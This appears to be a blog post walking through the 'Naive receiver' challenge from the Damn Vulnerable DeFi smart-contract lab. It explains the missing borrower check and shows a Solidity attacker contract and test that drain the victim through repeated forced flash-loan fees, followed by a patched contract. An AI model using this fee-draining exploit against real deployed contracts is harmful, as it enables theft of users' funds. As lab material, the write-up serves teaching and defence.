---
layout: post
title: Damn Vulnerable DeFi - Naive receiver
---

## Description
There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.

You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.

Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)

## Solution
The problem with _NaiveReceiverLenderPool_ is it doesn't check
that the caller and borrower are the same address. This means anyone can call `flashLoan` for the borrower and force them to pay the fixed fee!

The borrower has 10 ETH and the fee is 1 ETH. We can loop 10 times to perform 10 flash loans and drain the borrower's funds

```
contract NaiveReceiverAttacker {
    function attack(NaiveReceiverLenderPool naiveReceiverLenderPool, address borrower) external {
        for (uint256 i = 0; i < 10; ++i) {
            // A flashLoan for 0 ETH still forces the borrower to pay the fixed fee!
            naiveReceiverLenderPool.flashLoan(borrower, 0);
        }
    }
}
```

And the Javascript code
```
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */   
    const naiveReceiverAttacker = await (await ethers.getContractFactory('NaiveReceiverAttacker', deployer)).deploy()
    await naiveReceiverAttacker.attack(this.pool.address, this.receiver.address)
});
```

## Patched Contract
This one's an easy fix. Just check that the borrower address matches `msg.sender`. An even better solution would
be to remove the `borrower` parameter and always use `msg.sender` for the borrower, but we'll go with the first option
to preserve the interface.

```
contract NaiveReceiverLenderPoolV2 is ReentrancyGuard {

    using Address for address;

    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan

    function fixedFee() external pure returns (uint256) {
        return FIXED_FEE;
    }

    function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
        require(borrower == msg.sender, "Borrower not sender");
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");


        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        borrower.functionCallWithValue(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            ),
            borrowAmount
        );
        
        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }

    // Allow deposits of ETH
    receive () external payable {}
}
```

You can verify yourself that the exploit no longer works with `NaiveReceiverLenderPoolV2`!